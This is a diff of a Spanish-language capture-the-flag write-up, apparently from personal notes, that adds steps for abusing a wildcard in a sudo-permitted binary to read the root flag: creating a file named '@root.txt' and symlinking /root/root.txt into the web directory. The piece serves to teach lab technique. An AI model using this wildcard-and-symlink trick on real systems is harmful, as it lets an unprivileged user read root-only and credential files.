@@ -108,12 +108,13 @@ tenemos permisos de sudo para un binario llamado `/usr/bin/usage_management` el 
 ![[Pasted image 20240603234123.png]]
 
 `Wildcard`
-usando este script podemos explicar esta Wildcard para obtener el root.txt
+usando este script podemos explicar esta Wildcard para obtener el root.txt de la siguiente forma
 ```python
 	>cd /var/www/html/
 	
 	>touch '@root.txt'
 	
+	>ln -s -r /root/root.txt root.txt
 	
 ```
 ![[Pasted image 20240603234023.png]]
